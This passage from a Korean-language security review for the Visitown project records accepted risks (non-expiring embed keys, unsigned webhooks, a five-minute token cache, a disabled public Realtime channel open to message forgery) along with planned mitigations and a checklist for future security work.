- **S-25 임베드 키 만료**: README 배지·고객 홈페이지 iframe·OBS 소스가 영구 링크여야 하므로 만료를 두지 않는다. 노출됐을 때는 회전(기존 링크 즉시 무효)으로 대응하고, 회전 뒤 배지·iframe 주소를 바꿔야 한다는 안내가 임베드 패널에 있다.
- **S-26 웹훅 서명**: 보내는 곳이 슬랙·디스코드 수신 URL뿐이라 서명을 붙여도 검증할 주체가 없다. 임의 URL 웹훅을 열게 되면 그때 `X-Visitown-Signature: sha256=HMAC(본문, 사이트 비밀)`과 재전송 방지 타임스탬프를 같이 넣는다.
- **S-27 토큰 캐시**: `server/auth.js`가 검증 결과를 5분 캐시해 로그아웃·탈퇴 직후에도 최대 5분은 예전 토큰이 통한다. 토큰 만료(1시간)보다 짧고 DB 호출을 아끼는 쪽을 택했다.
- **S-35 인스턴스 버스(PEERS)**: `PEERS=1`이면 `server/peers.js`가 Supabase Realtime의 공개 채널(`realtime:visitown`)에 들어가 인스턴스끼리 이벤트·설정을 주고받는다. 채널 이름과 익명 키는 공개값이라 누구나 들어와 메시지를 엿보거나 `config` 메시지를 위조할 수 있다. 지금 운영 `.env`에는 `PEERS`가 없어 꺼져 있다. 수평 확장(로드맵 46)을 켜기 전에 비공개 채널(RLS로 join 제한) 또는 메시지 HMAC + 수신 값 검증(`onPeer`에서 타입·사이트 확인)을 넣는다.
- **S-28 운영 설정**: 운영 `server/.env`에 `ALLOWED_DASHBOARD_ORIGIN=https://visitown.vercel.app`을 켠다(지금은 주석). 수집 서버를 옮기면 `apps/web/lib/api.ts`의 `DEFAULT_API`(또는 Vercel 환경변수 `NEXT_PUBLIC_VT_API`)와 서버 `DASHBOARD_URL`을 같이 바꾼다. CSP에는 호스트가 없다.

## 4. 다음에 볼 때

- 새 입력 경로(API·SDK 옵션·설정 필드)를 만들면: 서버에서 타입·길이·허용값을 정하고, 대시보드에서 `innerHTML`에 넣을 때 `esc()`. 스모크 "보안:" 테스트에 페이로드를 하나 더 넣는다.
- 외부 출처(스크립트·스타일·이미지·연결)를 새로 쓰면 `apps/web/proxy.ts` CSP에 추가하고 스모크 테스트로 콘솔 오류 0을 확인한다.
- 임베드가 받을 SSE 프레임·필드를 늘리면 `server/embed.js` 허용 목록에 더하고 `tests/sse.test.js` S-34를 맞춘다. `?api=`를 읽는 새 자리는 `lib/api.ts` `clientApi`(토큰·스크립트가 걸린 곳) 또는 `embedApi`(읽기 전용 임베드)만 쓴다.
- 42 공개 직전: S-11 명령 재실행, `/security-review`, 이 표의 상태 갱신. 운영 Supabase에 S-32·S-33 SQL 블록 적용 여부와 S-28 `ALLOWED_DASHBOARD_ORIGIN`을 확인한다.
